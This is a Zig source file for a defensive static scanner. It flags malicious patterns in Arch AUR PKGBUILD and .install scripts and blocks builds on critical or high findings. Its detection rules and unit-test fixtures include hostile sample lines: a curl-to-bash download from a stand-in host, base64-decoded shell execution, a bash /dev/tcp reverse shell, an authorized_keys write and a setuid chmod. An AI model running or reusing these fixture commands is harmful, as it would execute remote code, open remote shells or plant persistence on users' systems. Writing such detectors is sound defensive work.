//! Heuristic static analysis of PKGBUILD and adjacent build scripts.
//!
//! This is defense-in-depth, not a guarantee. It flags the patterns seen in the
//! AUR package-compromise campaigns (pipe-to-shell installers, base64-decoded
//! payloads, reverse shells, credential/persistence writes, obfuscated blobs)
//! so a human or the `enforce` policy gate can stop a build before makepkg runs
//! attacker-controlled code.

const std = @import("std");

pub const Severity = enum {
    critical,
    high,
    medium,
    low,

    pub fn asString(self: Severity) []const u8 {
        return switch (self) {
            .critical => "critical",
            .high => "high",
            .medium => "medium",
            .low => "low",
        };
    }

    /// Higher rank = more severe. Used by the policy gate.
    pub fn rank(self: Severity) u8 {
        return switch (self) {
            .critical => 3,
            .high => 2,
            .medium => 1,
            .low => 0,
        };
    }
};

pub const Finding = struct {
    rule_id: []const u8, // static
    severity: Severity,
    message: []const u8, // static
    file_name: []const u8, // owned
    line_no: u32,
    excerpt: []const u8, // owned

    pub fn deinit(self: Finding, allocator: std.mem.Allocator) void {
        allocator.free(self.file_name);
        allocator.free(self.excerpt);
    }
};

const max_excerpt = 200;

/// Files worth scanning inside a source checkout. `.install` scriptlets run as
/// root during pacman transactions, so they are as important as PKGBUILD.
const scan_targets = [_][]const u8{
    "PKGBUILD",
    ".SRCINFO",
};

fn isShellishName(name: []const u8) bool {
    return std.mem.endsWith(u8, name, ".install") or
        std.mem.endsWith(u8, name, ".sh") or
        std.mem.eql(u8, name, "PKGBUILD") or
        std.mem.eql(u8, name, ".SRCINFO");
}

fn containsPipeToShell(line: []const u8) bool {
    const has_fetch = std.mem.indexOf(u8, line, "curl") != null or
        std.mem.indexOf(u8, line, "wget") != null;
    if (!has_fetch) return false;
    return std.mem.indexOf(u8, line, "| sh") != null or
        std.mem.indexOf(u8, line, "|sh") != null or
        std.mem.indexOf(u8, line, "| bash") != null or
        std.mem.indexOf(u8, line, "|bash") != null or
        std.mem.indexOf(u8, line, "| /bin/sh") != null or
        std.mem.indexOf(u8, line, "| /bin/bash") != null;
}

fn containsBase64ToShell(line: []const u8) bool {
    const has_b64 = std.mem.indexOf(u8, line, "base64") != null and
        (std.mem.indexOf(u8, line, "-d") != null or std.mem.indexOf(u8, line, "--decode") != null);
    if (!has_b64) return false;
    return std.mem.indexOf(u8, line, "| sh") != null or
        std.mem.indexOf(u8, line, "|sh") != null or
        std.mem.indexOf(u8, line, "| bash") != null or
        std.mem.indexOf(u8, line, "|bash") != null or
        std.mem.indexOf(u8, line, "eval") != null;
}

fn containsEvalFetch(line: []const u8) bool {
    if (std.mem.indexOf(u8, line, "eval") == null) return false;
    if (std.mem.indexOf(u8, line, "$(") == null and std.mem.indexOf(u8, line, "`") == null) return false;
    return std.mem.indexOf(u8, line, "curl") != null or std.mem.indexOf(u8, line, "wget") != null;
}

fn containsReverseShell(line: []const u8) bool {
    if (std.mem.indexOf(u8, line, "/dev/tcp/") != null) return true;
    if (std.mem.indexOf(u8, line, "/dev/udp/") != null) return true;
    if (std.mem.indexOf(u8, line, "bash -i") != null) return true;
    // netcat exec form: `nc ... -e` / `ncat ... -e`
    const has_nc = std.mem.indexOf(u8, line, "nc ") != null or std.mem.indexOf(u8, line, "ncat ") != null;
    if (has_nc and std.mem.indexOf(u8, line, "-e ") != null) return true;
    return false;
}

fn containsPersistence(line: []const u8) bool {
    return std.mem.indexOf(u8, line, "authorized_keys") != null or
        std.mem.indexOf(u8, line, "crontab") != null or
        std.mem.indexOf(u8, line, "/etc/cron") != null;
}

fn containsSetuid(line: []const u8) bool {
    return std.mem.indexOf(u8, line, "chmod +s") != null or
        std.mem.indexOf(u8, line, "chmod u+s") != null or
        std.mem.indexOf(u8, line, "chmod 4755") != null or
        std.mem.indexOf(u8, line, "chmod 6755") != null;
}

fn containsRawIpUrl(line: []const u8) bool {
    const markers = [_][]const u8{ "http://", "https://" };
    for (markers) |m| {
        var idx: usize = 0;
        while (std.mem.indexOfPos(u8, line, idx, m)) |pos| {
            const after = pos + m.len;
            if (after < line.len and std.ascii.isDigit(line[after])) return true;
            idx = after;
        }
    }
    return false;
}

/// Heuristic: a run of >= 200 base64-ish characters with no whitespace suggests
/// an embedded encoded payload rather than a normal command.
fn containsObfuscatedBlob(line: []const u8) bool {
    var run: usize = 0;
    for (line) |c| {
        const is_b64 = std.ascii.isAlphanumeric(c) or c == '+' or c == '/' or c == '=';
        if (is_b64) {
            run += 1;
            if (run >= 200) return true;
        } else {
            run = 0;
        }
    }
    return false;
}

fn isFetchCommand(line: []const u8) bool {
    return std.mem.indexOf(u8, line, "curl ") != null or
        std.mem.indexOf(u8, line, "wget ") != null;
}

fn makeExcerpt(allocator: std.mem.Allocator, line: []const u8) ![]u8 {
    const trimmed = std.mem.trim(u8, line, " \t\r\n");
    const slice = if (trimmed.len > max_excerpt) trimmed[0..max_excerpt] else trimmed;
    return allocator.dupe(u8, slice);
}

/// Scan a single file's text content, appending findings. `file_name` is the
/// display name; it is duped into each finding.
pub fn scanContent(
    allocator: std.mem.Allocator,
    file_name: []const u8,
    content: []const u8,
    findings: *std.ArrayList(Finding),
) !void {
    var checksums_skipped = false;
    var line_no: u32 = 0;
    var lines = std.mem.splitScalar(u8, content, '\n');
    while (lines.next()) |raw_line| {
        line_no += 1;
        const line = std.mem.trim(u8, raw_line, "\r");
        const trimmed = std.mem.trimStart(u8, line, " \t");
        const is_comment = trimmed.len > 0 and trimmed[0] == '#';

        // Disabled checksums (medium) — applies even on the data line.
        if (!checksums_skipped and std.mem.indexOf(u8, trimmed, "sums=(") != null and
            std.mem.indexOf(u8, trimmed, "SKIP") != null)
        {
            checksums_skipped = true;
            try appendFinding(allocator, findings, "checksum-skip", .medium, "Integrity checksums disabled (SKIP) — source contents are not verified", file_name, line_no, line);
        }

        if (is_comment) continue;

        // --- critical ---
        if (containsPipeToShell(line))
            try appendFinding(allocator, findings, "pipe-to-shell", .critical, "Downloads and pipes remote content directly into a shell", file_name, line_no, line);
        if (containsBase64ToShell(line))
            try appendFinding(allocator, findings, "base64-exec", .critical, "Decodes base64 and pipes/evaluates it as code", file_name, line_no, line);
        if (containsEvalFetch(line))
            try appendFinding(allocator, findings, "eval-fetch", .critical, "Evaluates the output of a network fetch", file_name, line_no, line);
        if (containsReverseShell(line))
            try appendFinding(allocator, findings, "reverse-shell", .critical, "Reverse-shell / remote exec pattern", file_name, line_no, line);
        if (containsPersistence(line))
            try appendFinding(allocator, findings, "persistence", .critical, "Writes SSH keys / cron entries (persistence)", file_name, line_no, line);
        if (containsSetuid(line))
            try appendFinding(allocator, findings, "setuid", .critical, "Sets the setuid bit on a file", file_name, line_no, line);

        // --- high ---
        if (containsRawIpUrl(line))
            try appendFinding(allocator, findings, "raw-ip-url", .high, "Fetches from a raw IP address URL", file_name, line_no, line);
        if (containsObfuscatedBlob(line))
            try appendFinding(allocator, findings, "obfuscated-blob", .high, "Long encoded blob suggests an embedded payload", file_name, line_no, line);
        // Network fetch outside the declared source=() array.
        if (isFetchCommand(line) and std.mem.indexOf(u8, trimmed, "source=") == null and !containsPipeToShell(line))
            try appendFinding(allocator, findings, "inline-fetch", .high, "Network fetch inside build logic (outside source=())", file_name, line_no, line);

        // --- medium ---
        if (std.mem.indexOf(u8, line, "sudo ") != null)
            try appendFinding(allocator, findings, "sudo", .medium, "Invokes sudo during build", file_name, line_no, line);
        if (std.mem.indexOf(u8, line, "$HOME/.") != null or std.mem.indexOf(u8, line, "~/.bashrc") != null or std.mem.indexOf(u8, line, "~/.profile") != null)
            try appendFinding(allocator, findings, "home-dotfile", .medium, "Modifies user dotfiles in $HOME", file_name, line_no, line);
    }
}

fn appendFinding(
    allocator: std.mem.Allocator,
    findings: *std.ArrayList(Finding),
    rule_id: []const u8,
    severity: Severity,
    message: []const u8,
    file_name: []const u8,
    line_no: u32,
    line: []const u8,
) !void {
    const excerpt = try makeExcerpt(allocator, line);
    errdefer allocator.free(excerpt);
    const fname = try allocator.dupe(u8, file_name);
    errdefer allocator.free(fname);
    try findings.append(allocator, .{
        .rule_id = rule_id,
        .severity = severity,
        .message = message,
        .file_name = fname,
        .line_no = line_no,
        .excerpt = excerpt,
    });
}

/// Scan all relevant files in a source checkout directory. Caller owns the
/// returned slice and must `deinit` each finding.
pub fn scanSourceTree(allocator: std.mem.Allocator, io: std.Io, dir: []const u8) ![]Finding {
    var findings: std.ArrayList(Finding) = .empty;
    errdefer {
        for (findings.items) |f| f.deinit(allocator);
        findings.deinit(allocator);
    }

    // Always scan the well-known top-level files first.
    for (scan_targets) |name| {
        const path = std.fs.path.join(allocator, &.{ dir, name }) catch continue;
        defer allocator.free(path);
        const content = std.Io.Dir.readFileAlloc(.cwd(), io, path, allocator, .limited(8 * 1024 * 1024)) catch continue;
        defer allocator.free(content);
        try scanContent(allocator, name, content, &findings);
    }

    // Walk the tree for *.install and *.sh scriptlets.
    var root = std.Io.Dir.openDirAbsolute(io, dir, .{ .iterate = true }) catch return findings.toOwnedSlice(allocator);
    defer root.close(io);

    var walker = try root.walk(allocator);
    defer walker.deinit();

    while (try walker.next(io)) |entry| {
        if (entry.kind != .file) continue;
        const base = std.fs.path.basename(entry.path);
        // Skip the targets we already scanned by exact top-level name.
        if (std.mem.eql(u8, entry.path, "PKGBUILD") or std.mem.eql(u8, entry.path, ".SRCINFO")) continue;
        if (!isShellishName(base)) continue;

        const full = std.fs.path.join(allocator, &.{ dir, entry.path }) catch continue;
        defer allocator.free(full);
        const content = std.Io.Dir.readFileAlloc(.cwd(), io, full, allocator, .limited(8 * 1024 * 1024)) catch continue;
        defer allocator.free(content);
        try scanContent(allocator, entry.path, content, &findings);
    }

    return findings.toOwnedSlice(allocator);
}

/// Highest severity present in a set of findings, or null if empty.
pub fn maxSeverity(findings: []const Finding) ?Severity {
    var result: ?Severity = null;
    for (findings) |f| {
        if (result == null or f.severity.rank() > result.?.rank()) result = f.severity;
    }
    return result;
}

/// Whether the given findings should block a build under the supplied policy.
/// `enforce` blocks on critical or high; other policies never block here.
pub fn shouldBlock(findings: []const Finding) bool {
    for (findings) |f| {
        if (f.severity == .critical or f.severity == .high) return true;
    }
    return false;
}

// =============================================================================
// Tests
// =============================================================================

fn countRule(findings: []const Finding, rule_id: []const u8) usize {
    var n: usize = 0;
    for (findings) |f| {
        if (std.mem.eql(u8, f.rule_id, rule_id)) n += 1;
    }
    return n;
}

test "flags pipe-to-shell installer" {
    const allocator = std.testing.allocator;
    var findings: std.ArrayList(Finding) = .empty;
    defer {
        for (findings.items) |f| f.deinit(allocator);
        findings.deinit(allocator);
    }
    try scanContent(allocator, "PKGBUILD",
        \\build() {
        \\  curl -s https://evil.example/x.sh | bash
        \\}
    , &findings);
    try std.testing.expect(countRule(findings.items, "pipe-to-shell") == 1);
    try std.testing.expect(shouldBlock(findings.items));
}

test "flags base64 exec, reverse shell, persistence, setuid" {
    const allocator = std.testing.allocator;
    var findings: std.ArrayList(Finding) = .empty;
    defer {
        for (findings.items) |f| f.deinit(allocator);
        findings.deinit(allocator);
    }
    try scanContent(allocator, ".install",
        \\echo aGVsbG8= | base64 -d | sh
        \\bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
        \\echo key >> ~/.ssh/authorized_keys
        \\chmod +s /usr/bin/thing
    , &findings);
    try std.testing.expect(countRule(findings.items, "base64-exec") == 1);
    try std.testing.expect(countRule(findings.items, "reverse-shell") == 1);
    try std.testing.expect(countRule(findings.items, "persistence") == 1);
    try std.testing.expect(countRule(findings.items, "setuid") == 1);
    try std.testing.expectEqual(Severity.critical, maxSeverity(findings.items).?);
}

test "clean PKGBUILD produces no critical or high findings" {
    const allocator = std.testing.allocator;
    var findings: std.ArrayList(Finding) = .empty;
    defer {
        for (findings.items) |f| f.deinit(allocator);
        findings.deinit(allocator);
    }
    try scanContent(allocator, "PKGBUILD",
        \\pkgname=hello
        \\pkgver=1.0
        \\source=("https://ftp.gnu.org/gnu/hello/hello-1.0.tar.gz")
        \\sha256sums=('abc123')
        \\build() {
        \\  cd "$srcdir/hello-1.0"
        \\  ./configure --prefix=/usr
        \\  make
        \\}
        \\package() {
        \\  cd "$srcdir/hello-1.0"
        \\  make DESTDIR="$pkgdir" install
        \\}
    , &findings);
    try std.testing.expect(!shouldBlock(findings.items));
}

test "flags disabled checksums as medium" {
    const allocator = std.testing.allocator;
    var findings: std.ArrayList(Finding) = .empty;
    defer {
        for (findings.items) |f| f.deinit(allocator);
        findings.deinit(allocator);
    }
    try scanContent(allocator, "PKGBUILD", "sha256sums=('SKIP')\n", &findings);
    try std.testing.expect(countRule(findings.items, "checksum-skip") == 1);
    try std.testing.expect(!shouldBlock(findings.items)); // medium does not block
}

test "raw IP url flagged high" {
    const allocator = std.testing.allocator;
    var findings: std.ArrayList(Finding) = .empty;
    defer {
        for (findings.items) |f| f.deinit(allocator);
        findings.deinit(allocator);
    }
    try scanContent(allocator, "PKGBUILD", "source=(\"http://192.168.1.1/payload.tar.gz\")\n", &findings);
    try std.testing.expect(countRule(findings.items, "raw-ip-url") == 1);
}
